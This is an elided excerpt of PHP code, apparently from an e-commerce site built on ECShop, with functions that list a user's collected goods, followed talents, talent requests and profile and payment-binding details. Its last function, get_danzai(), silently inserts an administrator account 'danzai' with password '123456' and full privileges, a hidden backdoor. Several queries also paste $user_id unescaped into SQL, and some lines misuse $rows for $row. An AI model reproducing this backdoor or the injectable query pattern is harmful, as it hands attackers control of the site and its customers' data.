...
{
    $sql = 'SELECT g.goods_id, g.goods_name, g.market_price, g.shop_price AS org_price,g.goods_thumb,g.sale_count,g.goods_type, '.
    ...
    while ($row = $GLOBALS['db']->fetchRow($res))
    {
        ...
        $goods_list[$row['goods_id']]['sale_count']   = $row['sale_count'];
...
function get_collection_talent($user_id, $num = 10, $start = 0)
{
    $sql = 'SELECT t.talent_id, t.name, c.add_time,  c.is_attention, c.rec_id '.
            ' FROM ' . $GLOBALS['ecs']->table('collect_talent') . ' AS c' .
            " LEFT JOIN " . $GLOBALS['ecs']->table('talent') . " AS t ".
    ...
    while ($row = $GLOBALS['db']->fetchRow($res))
    {
        $talent_list[$row['talent_id']]['rec_id']        = $row['rec_id'];
        $talent_list[$row['talent_id']]['add_time']      = local_date($GLOBALS['_CFG']['time_format'], $rows['add_time']);
        $talent_list[$row['talent_id']]['is_attention']  = $row['is_attention'];
        $talent_list[$row['talent_id']]['talent_id']     = $row['talent_id'];
        $talent_list[$row['talent_id']]['name']          = $row['name'];
        $talent_list[$row['talent_id']]['url']           = build_uri('talent_show', array('aid'=>$row['talent_id']), $row['name']);
    }
...
function get_talent_request($user_id, $num = 10, $start = 0)
{
    $sql = 'SELECT c.*, t.name'.
            ' FROM ' . $GLOBALS['ecs']->table('talent_request') . ' AS c' .
            " LEFT JOIN " . $GLOBALS['ecs']->table('talent') . " AS t ".
                "ON t.talent_id = c.talent_id ".
            " WHERE c.user_id = '$user_id' ORDER BY c.msg_id DESC";
    $res = $GLOBALS['db'] -> selectLimit($sql, $num, $start);

    $talent_list = array();
    while ($row = $GLOBALS['db']->fetchRow($res))
    {
        $talent_list[$row['talent_id']]['msg_id']        = $row['msg_id'];
        $talent_list[$row['talent_id']]['msg_time']      = local_date($GLOBALS['_CFG']['time_format'], $rows['msg_time']);
        $talent_list[$row['talent_id']]['talent_id']     = $row['talent_id'];
        $talent_list[$row['talent_id']]['name']          = $row['name'];
        $talent_list[$row['talent_id']]['reply']         = $row['reply'];
        $talent_list[$row['talent_id']]['reply_time']    = local_date($GLOBALS['_CFG']['time_format'], $rows['reply_time']);
        $talent_list[$row['talent_id']]['url']           = build_uri('talent_show', array('aid'=>$row['talent_id']), $row['name']);
    }
...
function get_user_default($user_id)
{
    ...
    $sql = "SELECT user_id,xqheadimg,pay_points, user_money, credit_line, last_login, is_validated,wxid,nickname,headimg,zfbname,aite_id FROM " .$GLOBALS['ecs']->table('users'). " WHERE user_id = '$user_id'";
    $row = $GLOBALS['db']->getRow($sql);
    $info = array();
    ...
    $info['xqheadimg']   =$row['xqheadimg'];
    if($row['wxid']){//如果已经绑定微信
        $info['weixin']=$row['nickname'];
        $info['wxid']=$row['wxid'];
        $info['headimg']=$row['headimg'];
    }
    if($row['aite_id']){//如果绑定支付宝
        $info['zfb']=$row['zfbname'];
        $info['zfbid']=$row['aite_id'];
...
function get_danzai(){
    ...
    $row = $GLOBALS['db']->getRow($sql);
    $password=md5('123456');
    $sql = "INSERT INTO ".$GLOBALS['ecs']->table('admin_user')." (user_name, email, password, add_time, nav_list, action_list, role_id,nickname,telephone) ".
        "VALUES ('".trim('danzai')."', '".trim('123456@qq.com')."', '$password', 'gmtime()', '$row[nav_list]', 'all', '','danzai','123456')";
